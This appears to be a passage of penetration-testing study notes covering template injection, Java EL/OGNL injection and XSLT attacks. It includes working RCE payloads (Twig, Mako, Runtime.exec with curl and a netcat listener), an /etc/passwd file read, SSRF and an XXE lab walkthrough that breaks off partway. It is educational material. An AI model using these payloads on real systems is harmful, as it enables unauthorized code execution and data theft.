+<span class="err">#</span> <span class="k">in</span> <span class="k">this</span> <span class="k">case</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">user</span> <span class="nx">could</span> <span class="nx">be</span> <span class="nx">able</span> <span class="nx">to</span> <span class="nx">inject</span> <span class="nx">the</span> <span class="nx">template</span> <span class="nx">expression</span> <span class="nx">independently</span><span class="p">.</span> 
+<span class="err">#</span> <span class="nx">We</span> <span class="nx">now</span> <span class="nx">control</span> <span class="nx">what</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">evaluated</span> <span class="nx">and</span> <span class="nx">most</span> <span class="nx">likely</span><span class="p">,</span> <span class="nx">user_name</span> <span class="nx">is</span> <span class="nx">the</span> <span class="nx">last</span> <span class="nx">thing</span> <span class="k">of</span> <span class="nx">interest</span><span class="p">.</span>
+</code></pre></div></div>
+
+<p>Most popular languages which use templates in web dev:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- PHP (Twig, Smarty)
+- Python (Flask, Jinja)
+- Java (Freemarker)
+</code></pre></div></div>
+
+<p>In Java apps, some technologies have a similar purpose of generating dynamic content:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- OGNL (Object-Graph Navigation Language) - frequently used in Apache Struts RCE exploits
+- EL (Expression Language) - generic dynamic expression set For Java applications
+</code></pre></div></div>
+
+<h3 id="detecting-template-injection">Detecting Template Injection</h3>
+<p>Tricky to find and exploit</p>
+
+<ul>
+  <li>we can inject multiple template tags into the web app and observe if they were transformed in some way in the response</li>
+  <li>Keep in mind, that often the injected data might be reflected indirectly, For instance, on a different page than it was injected (e.g. invalid login names might be reflected in admin-only accessible logs)</li>
+</ul>
+
+<p>Most template expression are similar to each other; they are all in curly braces like the below examples:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span><span class="nx">expr</span><span class="p">}</span> <span class="p">}</span>
+<span class="nx">$</span><span class="p">{</span><span class="nx">expr</span><span class="p">}</span>
+<span class="o">%</span><span class="p">{</span><span class="nx">expr</span><span class="p">}</span>
+<span class="err">#</span><span class="p">{</span><span class="nx">expr</span><span class="p">}</span>
+<span class="o">%</span><span class="mi">25</span><span class="p">{</span><span class="nx">expr</span><span class="p">}</span>
+<span class="p">{</span><span class="nx">expr</span><span class="p">}</span>
+</code></pre></div></div>
+
+<h3 id="confirming-template-injection">Confirming Template Injection</h3>
+<p>The best expression to inject:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">{</span><span class="mi">5</span><span class="o">*</span><span class="mi">11111</span><span class="p">}</span>
+<span class="err">#</span> <span class="k">in</span> <span class="k">this</span> <span class="k">case</span><span class="p">,</span> <span class="nx">you</span> <span class="nx">would</span> <span class="nx">look</span> <span class="nx">For</span> <span class="nx">the</span> <span class="nx">value</span> <span class="dl">'</span><span class="s1">55555</span><span class="dl">'</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">response</span> <span class="k">of</span> <span class="nx">your</span> <span class="nx">request</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Further confirmation is required to be sure that the code is executed on the server-side and has access to sensitive data</p>
+</blockquote>
+
+<p>With Burp Suite PRO, u should get an extension named <strong>J2EE Scan</strong> which automatically adds tests FOr expression language injection</p>
+
+<p>Another idea could be to use <strong>Burp Intruder</strong> to test several payloads of that type, as its likely that while,</p>
+
+<p>For example:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#{5*11111} # will work
+%{5*11111} # may not
+</code></pre></div></div>
+
+<p>You can use the following diagram to help u profiling this type of vuln, whether its a template or expression language injection</p>
+
+<p><img src="/assets/images/posts/ewptx/61.png" alt="Alt text" class="align-center" /></p>
+
+<h3 id="to-better-identify-the-technology">To better identify the technology</h3>
+<p>The first step after observing anomalies related to calculations or unusual handling of expressions in curly braces should be trying to identify the underlying technology</p>
+
+<ul>
+  <li>Observe which is the generic technology of the app. If its Java (u see it used .jsp extensions), then u can suspect its an expression language / OGNL</li>
+  <li>Use the diagram from before as it contains popular behavior of template engines when handling expressions</li>
+  <li>Try to inject unclosed curly braces (be careful as there is a chance u might permanently disable the attacked webpage); This might provoke verbose error disclosing the underlying technology</li>
+  <li>Observe other verbose errors For technology names</li>
+</ul>
+
+<h3 id="exploiting-template-injection">Exploiting Template Injection</h3>
+<p>PHP Smarty:</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># The RCE payload can be as simple as the one-liner:</span>
+<span class="p">{</span><span class="n">php</span><span class="p">}</span><span class="k">echo</span> <span class="s1">'id'</span><span class="p">;{</span><span class="o">/</span><span class="n">php</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>Python Mako:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;%</span>
+  <span class="kn">import</span> <span class="n">os</span>
+  <span class="n">x</span><span class="o">=</span><span class="n">os</span><span class="p">.</span><span class="nf">popen</span><span class="p">(</span><span class="sh">'</span><span class="s">id</span><span class="sh">'</span><span class="p">).</span><span class="nf">read</span><span class="p">()</span>
+<span class="o">%&gt;</span>
+<span class="err">$</span><span class="p">{</span><span class="n">x</span><span class="p">}</span>
+</code></pre></div></div>
+
+<p>PHP Twig:</p>
+
+<p>https://github.com/s4n7h0/xvwa</p>
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span><span class="mi">5</span><span class="o">*</span><span class="mi">5</span><span class="p">}</span> <span class="p">}</span> 
+<span class="c1"># results in "25"</span>
+
+<span class="p">{</span> <span class="p">{</span><span class="o">&lt;</span><span class="n">svg</span><span class="o">/</span><span class="n">onload</span><span class="o">=</span><span class="nf">confirm</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="o">&gt;</span><span class="p">}</span> <span class="p">}</span>
+<span class="c1"># u can observe a XSS vuln</span>
+</code></pre></div></div>
+
+<p>Twig used a known object named <em>**</em> = current application instance</p>
+
+<ul>
+  <li>one of the twigs _self attributes is named <strong>env</strong> and contains other methods that can be called</li>
+</ul>
+
+<p>→ https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php</p>
+
+<p>Example <em>display function</em>:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span> <span class="nx">_self</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nf">display</span><span class="p">(</span><span class="dl">"</span><span class="s2">xyz</span><span class="dl">"</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Executing commands via the getFilter function must be done as follows:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Call registerUndefinedFilterCallback, which allows us to register any function as a filter callback
+- The filter callback is then called by invoking _self.env.getFilter()
+</code></pre></div></div>
+
+<p>Example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span> <span class="p">{</span> <span class="nx">_self</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nf">registerUndefinedFilterCallback</span><span class="p">(</span><span class="dl">"</span><span class="s2">system</span><span class="dl">"</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span> <span class="p">{</span> <span class="p">{</span><span class="nx">_self</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nf">getFilter</span><span class="p">(</span><span class="dl">"</span><span class="s2">whoami</span><span class="dl">"</span><span class="p">)</span> <span class="p">}</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Moreover:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf
+</code></pre></div></div>
+
+<h2 id="expression-language--ognl-injection">Expression Language / OGNL injection</h2>
+<p>Java apps are easily recognizable because:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Use common extensions like .jsp or .jsf
+- Throw stack traces on errors
+- Use known terms in headers like "Servlet"
+</code></pre></div></div>
+
+<p>Confirm the injection with a calculation output:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${*5}
+{5*5}
+#{5*5}
+%{5*5}
+%25{5*5}
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/62.png" alt="Alt text" class="align-center" /></p>
+
+<p>The code is saved as Main.java</p>
+
+<ul>
+  <li>Several jars should be present to test properly</li>
+</ul>
+
+<p>→ https://commons.apache.org/proper/commons-lang/download_lang.cgi</p>
+
+<p>→ https://www.javadoc.io/doc/org.springframework/spring-core/latest/index.html</p>
+
+<p>→ https://www.javadoc.io/doc/org.springframework/spring-expression/latest/index.html</p>
+
+<blockquote>
+  <p>Make sure u have JDK working</p>
+</blockquote>
+
+<ul>
+  <li>try to run <strong>javac</strong> and <strong>java -version</strong></li>
+</ul>
+
+<p>Otherwise:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>update and <span class="nb">install </span>default-jdk
+</code></pre></div></div>
+
+<p>Compile the jar libraries</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javac <span class="nt">-cp</span> commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:.Main.java
+</code></pre></div></div>
+
+<p>Now we can use the java command, just change the javac to java and remove the .java extension at the end of the program name</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-cp</span> commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:.Main
+</code></pre></div></div>
+
+<p>Enter a String to evaluate:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="mi">5</span><span class="o">*</span><span class="mi">5</span><span class="p">}</span>
+<span class="p">[</span><span class="mi">25</span><span class="p">]</span>
+</code></pre></div></div>
+
+<h3 id="talking-to-el-parser">Talking to EL Parser</h3>
+<p>As the environment is set up, u can start to test the expressions:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">aaaa</span><span class="dl">"</span><span class="p">.</span><span class="nf">toString</span><span class="p">()}</span>
+<span class="p">[</span><span class="nx">aaaa</span><span class="p">]</span>
+<span class="p">{</span><span class="dl">"</span><span class="s2">bbb</span><span class="dl">"</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="dl">"</span><span class="s2">b</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">)}</span>
+<span class="p">[</span><span class="nx">xxx</span><span class="p">]</span>
+</code></pre></div></div>
+
+<h3 id="playing-with-classes">Playing with Classes</h3>
+<p>In situations where we cannot write plain code:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">"</span><span class="s2">x</span><span class="dl">"</span><span class="p">.</span><span class="nf">getClass</span><span class="p">()}</span>
+<span class="p">[</span><span class="kd">class</span> <span class="nc">java</span><span class="p">.</span><span class="nx">lang</span><span class="p">.</span><span class="nb">String</span><span class="p">]</span>
+
+<span class="p">{</span><span class="dl">""</span><span class="p">.</span><span class="nf">getClass</span><span class="p">().</span><span class="nf">forName</span><span class="p">(</span><span class="dl">"</span><span class="s2">java.util.Date</span><span class="dl">"</span><span class="p">)}</span>
+<span class="p">[</span><span class="kd">class</span> <span class="nc">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nb">Date</span><span class="p">]</span>
+</code></pre></div></div>
+
+<p>Enumeate the objects methods:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="dl">""</span><span class="p">.</span><span class="nf">getClass</span><span class="p">().</span><span class="nf">forName</span><span class="p">(</span><span class="dl">"</span><span class="s2">java.util.Date</span><span class="dl">"</span><span class="p">).</span><span class="nf">getMethods</span><span class="p">()[</span><span class="mi">0</span><span class="p">].</span><span class="nf">toString</span><span class="p">()}</span>
+<span class="p">[</span><span class="kr">public</span> <span class="nx">boolean</span> <span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nb">Date</span><span class="p">.</span><span class="nf">before</span><span class="p">(</span><span class="nx">java</span><span class="p">.</span><span class="nx">util</span><span class="p">.</span><span class="nb">Date</span><span class="p">)]</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>The first accessible method of java.util = <strong>before()</strong></p>
+</blockquote>
+
+<ul>
+  <li>https://www.javatpoint.com/java-date-before-method</li>
+  <li>The data package has a before() method that takes a Date object as an argument</li>
+</ul>
+
+<h3 id="el-code-execution">EL Code Execution</h3>
+<p>Trying RCE:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Java.lang.Runtime.getRuntime().exec(command)
+java.lang.ProcessBuilder(command, argument1, argument2).start()
+</code></pre></div></div>
+
+<p>getRuntime try:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s">""</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getMethods</span><span class="o">()[</span><span class="mi">6</span><span class="o">].</span><span class="na">toString</span><span class="o">()}</span>
+<span class="o">[</span><span class="kd">public</span> <span class="kd">static</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">()]</span>
+</code></pre></div></div>
+
+<p>Invoke the final function:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s">""</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"id"</span><span class="o">)}</span>
+<span class="o">[</span><span class="nc">Process</span><span class="o">[</span><span class="n">pid</span><span class="o">=</span><span class="mi">2770</span><span class="o">,</span> <span class="n">exitValue</span><span class="o">=</span><span class="mi">0</span><span class="o">]]</span>
+</code></pre></div></div>
+
+<p>In such a scenario, we would rather go For an interactive reverse shell. In this case, we confirm the existence of code execution by issuing curl,  as follows:</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span><span class="s">""</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">forName</span><span class="o">(</span><span class="s">"java.lang.Runtime"</span><span class="o">).</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">"curl http://127.0.0.1/rce"</span><span class="o">)}</span>
+<span class="o">[</span><span class="nc">Process</span><span class="o">[</span><span class="n">pid</span><span class="o">=</span><span class="mi">2816</span><span class="o">,</span> <span class="n">exitValue</span><span class="o">=</span><span class="s">"not exited"</span><span class="o">]]</span>
+</code></pre></div></div>
+
+<p>The request is received on a netcat listener:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 80
+</code></pre></div></div>
+
+<p>Curl is very useful, we can transfer files to and from the victim machine</p>
+
+<blockquote>
+  <p>So we can move a reverse shell and run it using the template injection RCE vuln</p>
+</blockquote>
+
+<h3 id="extending-el-exploitation">Extending EL Exploitation</h3>
+<p>Server variables usually have universal names - like :</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- ${application} 
+- ${session}
+- ${request}
+</code></pre></div></div>
+
+<blockquote>
+  <p>Burp Intruder can be utilized For injecting these and looking if interesting data is not returned in result (if the object is resolved)</p>
+</blockquote>
+
+<p>Some variables names can look like (they are executed in their respective template curly braces):</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">applicationScope</span> <span class="err">#</span> <span class="nb">global</span> <span class="nx">application</span> <span class="nx">variables</span>
+<span class="nx">requestScope</span> <span class="err">#</span> <span class="nx">request</span> <span class="nx">variables</span>
+<span class="nx">initParam</span> <span class="err">#</span> <span class="nx">application</span> <span class="nx">initialization</span> <span class="nx">variables</span>
+<span class="nx">sessionScope</span> <span class="err">#</span> <span class="nx">session</span> <span class="nx">variables</span>
+<span class="nx">param</span><span class="p">.</span><span class="nx">X</span> <span class="err">#</span> <span class="nx">parameter</span> <span class="nx">value</span> <span class="nx">where</span> <span class="nx">X</span> <span class="nx">is</span> <span class="nx">name</span> <span class="k">of</span> <span class="nx">a</span> <span class="nx">http</span> <span class="nx">parameter</span>
+</code></pre></div></div>
+
+<p>We can retrieve with .toString like that:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">{</span><span class="nx">sessionScope</span><span class="p">.</span><span class="nf">toString</span><span class="p">()}</span>
+</code></pre></div></div>
+
+<p>Sample authorization bypass might be similar to the below statement:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$</span><span class="p">{</span><span class="nx">pageContext</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nf">getSession</span><span class="p">().</span><span class="nf">setAttribute</span><span class="p">(</span><span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">,</span><span class="kc">true</span><span class="p">)}</span>
+</code></pre></div></div>
+
+<p>With burp intruder we can find variables with wordlists (like the follow):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${user}
+${password}
+${employee.FirstName}
+</code></pre></div></div>
+
+<p>Moreover:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/
+- https://sethjackson.github.io/2018/04/16/el-injection/
+- https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/
+</code></pre></div></div>
+
+<p>lets compile and exploit a simple example of the Spring Expression Language injection</p>
+
+<h2 id="xslt-purpose">XSLT Purpose</h2>
+<p>eXtensible Stylesheet Language Transformations is a language used in XML document transformations</p>
+
+<blockquote>
+  <p>aka as XSL</p>
+</blockquote>
+
+<p>The output of the transformation can be anything, but often is another xml or html-type file.</p>
+
+<ul>
+  <li>XSL uses its built-in functions and XPATH language to select and change parts of an XML document</li>
+</ul>
+
+<h3 id="xslt-example">XSLT Example</h3>
+
+<p><img src="/assets/images/posts/ewptx/63.png" alt="Alt text" class="align-center" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;xsl:template-match="/"&gt; is a directive that means that this stylesheet should apply to any ("/") xml nodes
+# For any XML structure ("/"), the output will look like the red code.
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/64.png" alt="Alt text" class="align-center" /></p>
+
+<p>You can also see other XSL directives. Those two use XPATH, which is a language used to traverse XML documents and find certain values. In this case, we use the value of (starting from the root node):</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Catalog
+  cd
+    title
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/65.png" alt="Alt text" class="align-center" /></p>
+
+<p>In the end, we receive an HTML table that contains values of the node <strong>title</strong>. Its purposely doubled. Of course, any other element can be imported into the result table.</p>
+
+<h3 id="experimenting-with-xslt-parser">Experimenting with XSLT Parser</h3>
+<p>Few well-known XSLT engines:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Saxon
+- Xalan
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt <span class="nb">install </span>default-jdk
+apt <span class="nb">install </span>libsaxonb-java
+</code></pre></div></div>
+
+<h3 id="xslt-documentation">XSLT Documentation</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- https://www.w3.org/TR/xslt-10/
+- https://www.w3.org/TR/xslt20/
+- https://www.w3.org/TR/xslt-30/
+</code></pre></div></div>
+
+<h3 id="xslt-file-read">XSLT File Read</h3>
+<p>If we control the XSL file:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">unparsed</span><span class="o">-</span><span class="nf">text</span><span class="p">(</span><span class="nx">$href</span> <span class="k">as</span> <span class="nx">xs</span><span class="p">:</span><span class="nx">string</span><span class="p">?)</span> <span class="k">as</span> <span class="nx">xs</span><span class="p">:</span><span class="nx">string</span><span class="p">?</span>
+<span class="nx">unparser</span><span class="o">-</span><span class="nf">text</span><span class="p">(</span><span class="nx">$href</span> <span class="k">as</span> <span class="nx">xs</span><span class="p">:</span><span class="nx">string</span><span class="p">?,</span> <span class="nx">$encoding</span> <span class="k">as</span> <span class="nx">xs</span><span class="p">:</span><span class="nx">string</span><span class="p">)</span> <span class="k">as</span> <span class="nx">xs</span><span class="p">:</span><span class="nx">string</span><span class="p">?</span>
+
+<span class="err">#</span> <span class="nx">the</span> <span class="dl">'</span><span class="s1">unparsed-text</span><span class="dl">'</span> <span class="kd">function</span> <span class="nf">reads</span> <span class="nx">an</span> <span class="nx">external</span> <span class="nx">resource</span> 
+<span class="err">#</span> <span class="p">(</span><span class="nx">For</span> <span class="nx">example</span><span class="p">:</span> <span class="nx">a</span> <span class="nx">file</span><span class="p">)</span> <span class="nx">and</span> <span class="nx">returns</span> <span class="nx">its</span> <span class="nx">contents</span> <span class="k">as</span> <span class="nx">a</span> <span class="nx">string</span>
+</code></pre></div></div>
+
+<p>Example:</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">xsl</span><span class="p">:</span><span class="nx">value</span><span class="o">-</span><span class="k">of</span> <span class="nx">select</span><span class="o">=</span><span class="dl">"</span><span class="s2">unparsed-text('/etc/passwd', 'utf-8')</span><span class="dl">"</span><span class="o">/&gt;</span>
+<span class="err">#</span> <span class="nx">the</span> <span class="nx">result</span> <span class="nx">contains</span> <span class="nx">a</span> <span class="o">/</span><span class="nx">etc</span><span class="o">/</span><span class="nx">passwd</span> <span class="nx">file</span>
+</code></pre></div></div>
+
+<p><img src="/assets/images/posts/ewptx/66.png" alt="Alt text" class="align-center" /></p>
+
+<p>XSL:Include is another interesting function, which allows us to join another xsl stylesheet. The downside is, it has to be a valid XSL document. Upside: SSRF is still possible.</p>
+
+<h3 id="xslt-ssrf">XSLT SSRF</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">xsl</span><span class="p">:</span><span class="nx">include</span> <span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://127.0.0.1:8080/xslt</span><span class="dl">"</span><span class="o">/&gt;</span>
+</code></pre></div></div>
+
+<p>The netcat listener receives the request. We can recognize the victim java version in the User-agent header.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 8080
+</code></pre></div></div>
+
+<h3 id="extending-xslt-attacks">Extending XSLT Attacks</h3>
+<p>In real world, its tough. But again documentation might help u to identify a severe vuln. Also, XSLT parsers may be vulnerable to XXE vulns in the same way as all other XML parsers.</p>
+
+<blockquote>
+  <p>WHen responding to <strong>XSL:INCLUDE</strong> directives, u might also try to respond with XML that contains an XXE payload.</p>
+</blockquote>
+
+<blockquote>
+  <p>Moreover, XSLT engines might be able to execute custom code, which results in RCE</p>
+</blockquote>
+
+<p>the second input is the XSLT code</p>
+
+<p>the transformation is defined</p>
+
+<p>in this case, we use the value of (starting from the root node)</p>
+
+<p>unparsed-text example</p>
+
+<h2 id="lab-1---ssrf-to-rce">Lab 1 - SSRF to RCE</h2>
+
+<p>Solution</p>
+
+<p>Step 1: Open the lab link to access the Kali GUI instance.</p>
+
+<p>…</p>
+
+<p>Step 2: Check if the provided machine/domain is reachable.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping <span class="nt">-c3</span> demo.ine.local
+</code></pre></div></div>
+
+<blockquote>
+  <p>The provided machine is reachable.</p>
+</blockquote>
+
+<p>Step 3: Check open ports on the provided machine.</p>
+
+<p>Command:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sS</span> <span class="nt">-sV</span> demo.ine.local
+</code></pre></div></div>
+
+<p>Ports 22 (SSH), 5000, and 8000 (Python-based HTTP server) are open on the target machine. As mentioned in the challenge description, the vulnerable web application is available on port 5000.</p>
+
+<p>Also, if you check the output from Nmap, you will find out the fingerprint for the service running at port 5000. It contains the HTTP response.</p>
+
+<p>Step 4: Check the web application available on port 5000.</p>
+
+<p>Open the following URL in the browser:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>URL: http://demo.ine.local:5000
+</code></pre></div></div>
+
+<p>An XML Validator application is available on port 5000.</p>
+
+<p>Send the following XML snippet for validation:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;parent&gt;</span>
+  <span class="nt">&lt;child&gt;</span>
+    <span class="nt">&lt;name&gt;</span>Test Name<span class="nt">&lt;/name&gt;</span>
+    <span class="nt">&lt;description&gt;</span>Test Description<span class="nt">&lt;/description&gt;</span>
+  <span class="nt">&lt;/child&gt;</span>
+<span class="nt">&lt;/parent&gt;</span>
+</code></pre></div></div>
+
+<p>Click on the Validate XML button:</p>
+
+<ul>
+  <li>The response indicates that the supplied XML is valid.</li>
+</ul>
+
+<blockquote>
+  <p>Notice that the supplied XML is also reflected in the response.</p>
+</blockquote>
+
+<p>Step 5: Identify and exploit the XXE vulnerability.</p>
+
+<p>Send the following XML snippet containing an XML entity:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY desc "Test Description"&gt;</span> ]&gt;
+<span class="nt">&lt;parent&gt;</span>
+  <span class="nt">&lt;child&gt;</span>
+    <span class="nt">&lt;name&gt;</span>Test Name<span class="nt">&lt;/name&gt;</span>
+    <span class="nt">&lt;description&gt;</span><span class="ni">&amp;desc;</span><span class="nt">&lt;/description&gt;</span>
+  <span class="nt">&lt;/child&gt;</span>
+<span class="nt">&lt;/parent&gt;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Notice the response contains the description specified in the XML entity!</p>
+</blockquote>
+
+<blockquote>
+  <p>Note that we know there is an XXE vulnerability; lets leverage it to pull information on the internal services running on the target machine.</p>
+</blockquote>
+
+<p>Use the following XML snippet to read the contents of the /proc/net/tcp file:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE data [
+  &lt;!ENTITY file SYSTEM "file:///proc/net/tcp"&gt;</span>
+]&gt;
+
+<span class="nt">&lt;data&gt;</span><span class="ni">&amp;file;</span><span class="nt">&lt;/data&gt;</span>
+</code></pre></div></div>
+
+<p>Information: The /proc/net/tcp file contains information on the current TCP network connections.</p>
+
+<blockquote>
+  <p>Notice we got back the file contents!</p>
+</blockquote>
+
+<p>Contents of the /proc/net/tcp file:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sl local_address rem_address st tx_queue rx_queue <span class="nb">tr </span>tm-&gt;when retrnsmt uid <span class="nb">timeout </span>inode
+0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74435656 1 0000000000000000 100 0 0 10 0
+1: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74418007 1 0000000000000000 100 0 0 10 0
+2: 0B00007F:9599 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534 0 74430920 1 0000000000000000 100 0 0 10 0
+3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74434697 1 0000000000000000 100 0 0 10 0
+4: 034CDCC0:1F40 024CDCC0:EB4C 06 00000000:00000000 03:0000176F 00000000 0 0 0 3 0000000000000000
+5: 034CDCC0:1F40 024CDCC0:EB4E 01 00000000:00000000 00:00000000 00000000 0 0 74434828 1 0000000000000000 20 4 30 10 <span class="nt">-1</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>[Note] The information you received would differ slightly since the IP addresses of the machines change at every lab launch. Kindly make sure to fetch the contents of the above file before proceeding.</p>
+</blockquote>
+
+<p>Step 6: Decode the IP addresses and port numbers retrieved from the /proc/net/tcp file.</p>
+
+<p>Use the following Python script to convert the IP addresses in hex to dotted-decimal notation:</p>
+
+<p>convert.py:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">socket</span>
+<span class="kn">import</span> <span class="n">struct</span>
